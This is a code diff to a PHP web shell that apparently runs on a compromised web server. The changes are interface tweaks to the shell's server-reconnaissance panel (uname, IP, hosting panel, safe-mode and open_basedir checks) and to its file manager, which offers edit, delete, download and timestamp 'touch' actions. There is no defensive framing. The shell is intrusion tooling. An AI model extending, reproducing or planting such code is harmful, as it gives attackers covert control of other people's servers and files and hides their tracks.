@@ -72,10 +72,10 @@ function serverSecInfo(){
 	if(AvFunc(array('mssql_connect'))){$temp[] = "MSSQL";}
 	if(AvFunc(array('pg_connect'))){$temp[] = "PostgreSQL";}
 	if(AvFunc(array('oci_connect'))){$temp[] = "Oracle";}
+	$sInfo[] = showInf('System', @php_uname());
 	$sInfo[] = showInf('Server software', (AvFunc(array('getenv')) ? @getenv('SERVER_SOFTWARE') : 'Unknown'));
 	$sInfo[] = showInf('Server ip', (AvFunc(array('gethostbyname')) ? @gethostbyname($_SERVER['HTTP_HOST']) : 'Unknown'));
 	$sInfo[] = showInf('Server panel', serverPanel());
-	$sInfo[] = showInf('Uname', @php_uname());
 	if(AvFunc(array('ini_get'))){
 		$sInfo[] = showInf('Open base dir', @ini_get('open_basedir'));
 		$sInfo[] = showInf('Safe mode', (@ini_get('safe_mode') ? 'ON' : 'OFF'));
@@ -389,7 +389,7 @@ function filemanager($fm){
 		<form method='post' action='?act=mkdir' class='mb-3' id='rqmkdir'>
 			<input type='hidden' name='xpath' value=''/>
 			<div class='input-group'>
-				<select class='custom-select border-success' name='xtype' style='max-width:110px;'>
+				<select class='custom-select border-success' name='xtype' style='max-width:90px;'>
 					<option value='dir' selected>New dir</option>
 					<option value='file'>New file</option>
 				</select>
@@ -423,12 +423,14 @@ function filemanager($fm){
 			</div>
 		</form>
 	</div>";
-	$fmtable .= "<div class='col-12 mb-3'><div class='table-responsive'><table class='table table-sm w-100 mb-0'><thead class='bg-dark text-light'><tr><th class='text-center' style='min-width:150px;'>Name</th><th class='text-center' style='min-width:100px;'>Modified</th><th class='text-center' style='min-width:125px;'>User/Group</th><th class='text-center' style='min-width:100px;'>Perm</th><th class='text-center' style='min-width:90px;'>Options</th></tr></thead><tbody>";
+	$fmtable .= "<div class='col-12 mb-3'><div class='table-responsive'><table class='table table-sm w-100 mb-0'><thead class='bg-dark text-light'><tr><th class='text-center' style='min-width:150px;'>Name</th><th class='text-center' style='min-width:100px;'>Modified</th><th class='text-center' style='min-width:125px;'>User/Group</th><th class='text-center' style='min-width:100px;'>Permission</th><th class='text-center' style='min-width:90px;'>Options</th></tr></thead><tbody>";
+	$cDir = 0; $cFile = 0;
 	if(count($lokasinya)>0){
 		foreach($lokasinya as $kl => $dir){
 			$owner = owner($dir['full_path']);
 			$fSize = $dir['type'] == 'dir' ? countDir($dir['full_path']) . " items" : sizeFilter(@filesize($dir['full_path']));
 			if($dir['type'] == 'dir'){
+				$cDir += 1;
 				$txcol = stColor($dir['full_path']);
 				switch($txcol){
 					case 'text-danger' : $dlinks = "<span class='text-danger'>{$dir['entry']}</span>"; break;
@@ -453,6 +455,7 @@ function filemanager($fm){
 					$formper = statusnya($dir['full_path']);
 					$formsel = "<select class='custom-select custom-select-sm border-success'><option value=''></option></select>";
 				}
+				$formper .= "<span class='fsmall mt-n1 d-block text-secondary'>".substr(sprintf("%o", @fileperms($dir['full_path'])),-4)."</span>";
 				$fmtable .= "<tr>
 					<td class='text-left align-middle'>
 						<div class='media dir'>".fType('dir','1.7em')."<div class='media-body'>{$dlinks}<span class='fsmall'>{$fSize}</span></div></div>
@@ -463,12 +466,14 @@ function filemanager($fm){
 					<td class='text-center align-middle'>{$formsel}</td>
 				</tr>";
 			} else {
+				$cFile += 1;
 				$fcolor = stColor($dir['full_path']);
 				switch($fcolor){
 					case 'text-danger' : $flinks = "<span class='text-danger'>".statusnya($dir['full_path'])."</span>"; break;
 					case 'text-warning' : $flinks = "<span class='text-warning'>".statusnya($dir['full_path'])."</span>"; break;
 					case 'text-success' :$flinks = "<a href='#' class='{$fcolor}' data-toggle='modal' data-target='#showchmod' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xperm='".substr(sprintf('%o', fileperms($dir['full_path'])), -4)."'/>" . statusnya($dir['full_path']) . "</a>"; break;
 				}
+				$flinks .= "<span class='fsmall mt-n1 d-block text-secondary'>".substr(sprintf("%o", @fileperms($dir['full_path'])),-4)."</span>";
 				$ext  = pathinfo($dir['full_path'], PATHINFO_EXTENSION);
 				$zadd = '';
 				if(!empty($ext)){
@@ -495,7 +500,7 @@ function filemanager($fm){
 					case 'text-danger' : $fselc = "<span class='text-danger'>-</span>"; break;
 					case 'text-warning' : $fselc = "<select class='custom-select custom-select-sm border-success' id='showaksi'><option value=''></option><option value='view' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>view</option></select>"; break;
 					case 'text-success' : $fselc = "<select class='custom-select custom-select-sm border-success' id='showaksi'><option value=''></option><option value='view' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>view</option><option value='edit' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>edit</option><option value='rename' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>rename</option><option value='touch' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}' data-xtime='".date('Y-m-d H:i:s', @filemtime($dir['full_path']))."'>touch</option><option value='download' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>download</option>{$zadd}<option value='del' data-xtype='file' data-xname='{$dir['entry']}' data-xpath='{$dir['entry_path']}'>del</option></select>"; break;
-				}				
+				}
 				$fmtable .= "<tr>
 					<td class='text-left align-middle'>
 						<div class='media file'>{$ftype}<div class='media-body'>{$dir['entry']}<span class='fsmall'>{$fSize}</span></div></div>
@@ -510,7 +515,8 @@ function filemanager($fm){
 	} else {
 		$fmtable .= "<tr><td class='text-center' colspan='5'>Direktori tidak berisi file apapun</td></tr>";
 	}
-	$fmtable .= "</tbody></table></div></div>";
+	$fmtable .= "</tbody><tfoot class='text-light'><tr><th class='font-weight-normal small' colspan='5'>Dir: <span class='text-warning'>{$cDir}</span>, Files: <span class='text-warning'>{$cFile}</span></th></tr></tfoot>";
+	$fmtable .= "</table></div></div>";
 	return $fmtable;
 }
 if(isset($_GET['act'])){
@@ -993,12 +999,12 @@ if(!isset($_SESSION['auth'])){
 		<link rel="shortcut icon" href="<?php echo fType('logo');?>"/>
 		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css" integrity="sha512-rt/SrQ4UNIaGfDyEXZtNcyWvQeOq0QLygHluFQcSjaGB04IxWhal71tKuzP6K8eYXYB6vJV4pHkXcmFGGQ1/0w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
 		<title><?php echo $stitle;?></title>
-		<style>@import url(https://fonts.googleapis.com/css2?family=Ubuntu+Mono:ital,wght@0,400;0,700;1,400;1,700&display=swap);body,html,input,pre,select,textarea.form-control{transition:font-size .3s ease-in}:root{--cyan:#2be2ff;--bg-icon:#149232;--bg-success:#00d433;--bs-success-rgb:0,212,51;--bs-danger-rgb:220,53,69}::-webkit-scrollbar-track{border-radius:6px;background-color:#2b2f34}::-webkit-scrollbar{width:6px;height:4px}::-webkit-scrollbar-thumb{border-radius:6px;-webkit-box-shadow:inset 0 0 4px #000;background-color:var(--bg-icon)}body,html,pre{font-family:"Ubuntu Mono",monospace}.modal .modal-body,body,html{background:#2b2f34}body button{color:#eee}body{font-size:1em;padding-top:4rem;color:#ddd}.row{margin-left:-10px;margin-right:-10px}.col,[class*=col-]{padding-right:10px;padding-left:10px}input,select{font-size:1em!important}nav .nav-tabs{border-bottom:1px solid #00a6c0}nav .nav-tabs .nav-link.active{background:#00a6c0;color:#fff}nav .nav-tabs .nav-link.active svg path{fill:#ffffff!important}nav .nav-tabs .nav-link.active,nav .nav-tabs .nav-link:focus,nav .nav-tabs .nav-link:hover{border:1px solid #2be2ff}table{border-radius:10px}table td,table th{border-top:1px solid #444c54!important}table tr:nth-child(odd){background:rgb(0,0,0,3%)}table thead th{background:rgb(var(--bs-success-rgb),20%);border-top:0 solid #eee!important;border-bottom:2px solid var(--bg-success)!important}table tbody tr td:first-child{padding-left:0}table tbody tr td:last-child{padding-right:0}table thead tr th:first-child{border-top-left-radius:.25rem}table thead tr th:last-child{border-top-right-radius:.25rem}.breadcrumb-item a,table tbody{color:#cfdce8}table tbody tr:hover td{color:#fff;transition:background .3s ease-in}table tbody tr:hover{background:rgb(var(--bs-success-rgb),10%)}.breadcrumb{background:linear-gradient(170deg,rgb(var(--bs-success-rgb),20%),transparent);padding:4px 10px}.breadcrumb-item a:hover{color:var(--bg-success)}.breadcrumb-item+.breadcrumb-item{padding-left:.2rem}.breadcrumb-item+.breadcrumb-item::before{padding-right:.2rem}pre,textarea.form-control{font-size:1em;border:0!important;color:#cfdce8!important;height:auto;max-height:500px}.form-control-sm{height:auto}.form-control:disabled,.form-control[readonly]{background:#272c31;color:#767676}.media.dir svg{margin:auto;padding-right:.5em}.media.file svg{margin:auto;padding:0 .7em 0 .25em}.fsmall{display:block;font-size:1.75vh;color:#61aa64}.bg-success-rgb,.input-group-prepend *{background:rgb(var(--bs-success-rgb),10%);border:1px solid rgb(var(--bs-success-rgb),50%);color:rgb(var(--bs-success-rgb),90%)}#hasilcommand *,input[type=text],input[type=text]:active,input[type=text]:focus{background:#343a40;color:#cfdce8}select{background-color:#343a40!important;color:#cfdce8!important}.custom-select{padding:5px 10px;color:#cfdce8;background:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='4' height='5' viewBox='0 0 4 5'%3e%3cpath fill='%23149232' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") right .75rem center/8px 10px no-repeat #343a40}.custom-file *{background:#343a40;color:#cfdce8;border:1px solid rgb(var(--bs-success-rgb),50%)}.custom-file-label::after{content:"Upload";color:var(--success);background:#2b2f34}#hasilcommand .card{border-radius:.25rem;border:1px solid rgb(var(--bs-success-rgb),50%)}#hasilcommand .card .card-body{border-radius:.25rem}.text-success{color:rgb(0,212,51,90%)!important}.text-cyan{color:var(--cyan)!important;color:#eee}.toast.show{margin-top:40px!important}@media screen and (max-width:420px){nav .nav-tabs .nav-link{padding:.5rem 1rem;letter-spacing:-.1em}.btn{padding:0 10px!important}}@media screen and (max-width:767px){body{padding-top:4rem}.container{max-width:100%!important}.blockquote,.btn,.input-group-text,body{font-size:.8em!important;transition:font-size .3s ease-in}.fsmall{font-size:1.5vh}.form-control-sm{font-size:initial;height:auto}.custom-select{font-size:inherit;height:auto!important;transition:font-size .3s ease-in}.custom-file,.custom-file-input,.custom-file-label{height:calc(1.5em + .75rem)!important}}</style>
+		<style>@import url(https://fonts.googleapis.com/css2?family=Ubuntu+Mono:ital,wght@0,400;0,700;1,400;1,700&display=swap);table tfoot th,table thead th{background:rgb(var(--bs-success-rgb),20%)}body,html,input,pre,select,textarea.form-control{transition:font-size .3s ease-in}:root{--cyan:#2be2ff;--bg-icon:#149232;--bg-success:#00d433;--bs-success-rgb:0,212,51;--bs-danger-rgb:220,53,69}::-webkit-scrollbar-track{border-radius:6px;background-color:#2b2f34}::-webkit-scrollbar{width:6px;height:4px}::-webkit-scrollbar-thumb{border-radius:6px;-webkit-box-shadow:inset 0 0 4px #000;background-color:var(--bg-icon)}body,html,pre{font-family:"Ubuntu Mono",monospace}.modal .modal-body,body,html{background:#2b2f34}body button{color:#eee}body{font-size:1em;padding-top:4rem;color:#ddd}.row{margin-left:-10px;margin-right:-10px}.col,[class*=col-]{padding-right:10px;padding-left:10px}input,select{font-size:1em!important}nav .nav-tabs{border-bottom:1px solid #00a6c0}nav .nav-tabs .nav-link.active{background:#00a6c0;color:#fff}nav .nav-tabs .nav-link.active svg path{fill:#ffffff!important}nav .nav-tabs .nav-link.active,nav .nav-tabs .nav-link:focus,nav .nav-tabs .nav-link:hover{border:1px solid #2be2ff}table{border-radius:10px}table td,table th{border-top:1px solid #444c54!important}table tr:nth-child(odd){background:rgb(0,0,0,3%)}table thead th{border-top:0 solid #eee!important;border-bottom:2px solid var(--bg-success)!important}table tfoot th{padding:5px 10px!important;border-top:2px solid var(--bg-success)!important;border-bottom:0 solid #eee!important}table tbody tr td:first-child{padding-left:0}table tbody tr td:last-child{padding-right:0}table thead tr th:first-child{border-top-left-radius:.25rem}table thead tr th:last-child{border-top-right-radius:.25rem}table tfoot tr th:first-child{border-bottom-left-radius:.25rem}table tfoot tr th:last-child{border-bottom-right-radius:.25rem}.breadcrumb-item a,table tbody{color:#cfdce8}table tbody tr:hover td{color:#fff;transition:background .3s ease-in}table tbody tr:hover{background:rgb(var(--bs-success-rgb),10%)}.table-responsive{border-radius:.5em}.breadcrumb{background:linear-gradient(170deg,rgb(var(--bs-success-rgb),20%),transparent);padding:4px 10px}.breadcrumb-item a:hover{color:var(--bg-success)}.breadcrumb-item+.breadcrumb-item{padding-left:.2rem}.breadcrumb-item+.breadcrumb-item::before{padding-right:.2rem}pre,textarea.form-control{font-size:1em;border:0!important;color:#cfdce8!important;height:auto;max-height:500px}.form-control-sm{height:auto}.form-control:disabled,.form-control[readonly]{background:#272c31;color:#767676}.media.dir svg{margin:auto;padding-right:.5em}.media.file svg{margin:auto;padding:0 .75em 0 0}.fsmall{display:block;font-size:1.75vh;color:#61aa64}.bg-success-rgb,.input-group-prepend *{background:rgb(var(--bs-success-rgb),10%);border:1px solid rgb(var(--bs-success-rgb),50%);color:rgb(var(--bs-success-rgb),90%)}#hasilcommand *,input[type=text],input[type=text]:active,input[type=text]:focus{background:#343a40;color:#cfdce8}select{background-color:#343a40!important;color:#cfdce8!important}.custom-select{padding:5px 10px;color:#cfdce8;background:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='4' height='5' viewBox='0 0 4 5'%3e%3cpath fill='%23149232' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") right .75rem center/8px 10px no-repeat #343a40}.custom-file *{background:#343a40;color:#cfdce8;border:1px solid rgb(var(--bs-success-rgb),50%)}.custom-file-label::after{content:"Upload";color:var(--success);background:#2b2f34}#hasilcommand .card{border-radius:.25rem;border:1px solid rgb(var(--bs-success-rgb),50%)}#hasilcommand .card .card-body{border-radius:.25rem}.text-success{color:rgb(0,212,51,90%)!important}.text-cyan{color:var(--cyan)!important;color:#eee}.toast.show{margin-top:40px!important}@media screen and (max-width:420px){nav .nav-tabs .nav-link{padding:.5rem 1rem;letter-spacing:-.1em}.btn{padding:0 10px!important}}@media screen and (max-width:767px){body{padding-top:4rem}.container{max-width:100%!important}.blockquote,.btn,.input-group-text,body{font-size:.8em!important;transition:font-size .3s ease-in}.fsmall{font-size:1.5vh}.form-control-sm{font-size:initial;height:auto}.custom-select{font-size:inherit;height:auto!important;transition:font-size .3s ease-in}.custom-file,.custom-file-input,.custom-file-label{height:calc(1.5em + .75rem)!important}}</style>
 	</head>
 	<body>
 		<header class="header bg-dark fixed-top mt-auto py-1">
 			<div class="container my-2">
-				<span class="text-light"><img src="<?php echo fType('logo');?>" class="mr-2" style="width:20px;"/><?php echo $stitle;?></span>
+				<a href="<?php echo $_SERVER['PHP_SELF'];?>" class="text-light text-decoration-none"><img src="<?php echo fType('logo');?>" class="mr-2" style="width:20px;"/><?php echo $stitle;?></a>
 				<div class="d-block float-right">
 					<a href="?act=logout"><?php echo fType('out','1em');?></a>
 				</div>
